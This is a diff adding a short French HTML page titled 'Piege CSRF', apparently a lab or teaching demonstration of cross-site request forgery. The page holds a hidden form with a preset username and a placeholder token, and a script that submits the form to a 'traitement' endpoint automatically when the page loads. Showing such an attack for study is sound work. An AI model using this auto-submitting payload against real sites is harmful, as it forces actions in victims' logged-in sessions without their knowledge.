@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="ISO-8859-1">
+<title>Piege CSRF</title>
+</head>
+<body>
+
+<form name="formtest" action="traitement" method="post">
+	<label for="name">Nom&nbsp;:</label>
+	<input type="hidden" id="name" name="username" value="FidelePiege">
+	<input type="hidden" name="token" value="token">
+</form>
+
+<script type="text/javascript">
+   document.forms["formtest"].submit();
+</script>
+
+</body>
+</html>
